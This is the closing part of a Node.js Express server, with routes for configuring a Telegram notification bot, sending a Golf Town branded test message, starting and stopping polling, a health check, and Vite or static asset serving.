      message: `Error sending via Nodemailer: ${error?.message || 'unknown error'}. Notice was NOT sent.`,
      debugLogs: sessionLogs
    });
  }
});


// GET Telegram Config
app.get('/api/telegram-config', (req, res) => {
  res.json({
    telegramToken: customTelegramConfig.telegramToken,
    telegramChatId: customTelegramConfig.telegramChatId,
    isPollingActive: isPollingLoopRunning
  });
});

// POST Save Telegram Config
app.post('/api/telegram-config', async (req, res) => {
  const { telegramToken, telegramChatId } = req.body;
  
  const tokenChanged = telegramToken !== undefined && telegramToken !== customTelegramConfig.telegramToken;
  
  if (telegramToken !== undefined) {
    customTelegramConfig.telegramToken = telegramToken;
  }
  if (telegramChatId !== undefined) {
    customTelegramConfig.telegramChatId = telegramChatId;
  }
  
  saveTelegramConfig(customTelegramConfig);

  if (tokenChanged) {
    await stopTelegramPolling();
    if (customTelegramConfig.telegramToken) {
      await startTelegramPolling();
    }
  }

  res.json({
    success: true,
    message: 'Telegram integration configuration updated.',
    config: {
      telegramToken: customTelegramConfig.telegramToken,
      telegramChatId: customTelegramConfig.telegramChatId,
      isPollingActive: isPollingLoopRunning
    }
  });
});

// POST Send Test Message
app.post('/api/telegram-config/test', async (req, res) => {
  if (!customTelegramConfig.telegramToken) {
    return res.status(400).json({ success: false, error: 'No Telegram bot token is configured.' });
  }
  if (!customTelegramConfig.telegramChatId) {
    return res.status(400).json({ success: false, error: 'No target Chat ID is configured. Please bind the bot in your group by typing /start first.' });
  }

  const result = await sendTelegramRequest('sendMessage', {
    chat_id: customTelegramConfig.telegramChatId,
    text: `🔔 *GOLF TOWN INTEGRATION TEST NOTICE* 🔔\n\nThis is an authorized SMTP/HTTP system confirmation notice. Your interactive Telegram webhook connection is 100% active and running.`,
    parse_mode: 'Markdown'
  });

  if (result && result.ok) {
    res.json({ success: true, message: 'Test message transmitted successfully to your group!' });
  } else {
    res.status(500).json({ success: false, error: result?.description || 'Telegram Bot API error.' });
  }
});

// POST Manual Start/Stop Polling
app.post('/api/telegram-config/start-polling', async (req, res) => {
  if (!customTelegramConfig.telegramToken) {
    return res.status(400).json({ success: false, error: 'Cannot start polling without a valid bot token.' });
  }
  await startTelegramPolling();
  res.json({ success: true, isPollingActive: isPollingLoopRunning });
});

app.post('/api/telegram-config/stop-polling', async (req, res) => {
  await stopTelegramPolling();
  res.json({ success: true, isPollingActive: isPollingLoopRunning });
});


// API health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

// Vite middleware setup for development / production static serving
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath, {
      maxAge: '1y',
      immutable: true,
      setHeaders: (res, filePath) => {
        // Set public, immutable, long-lived cache headers for assets folder
        if (filePath.includes('/assets/')) {
          res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        } else {
          res.setHeader('Cache-Control', 'public, max-age=3600');
        }
      }
    }));
    app.get('*all', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
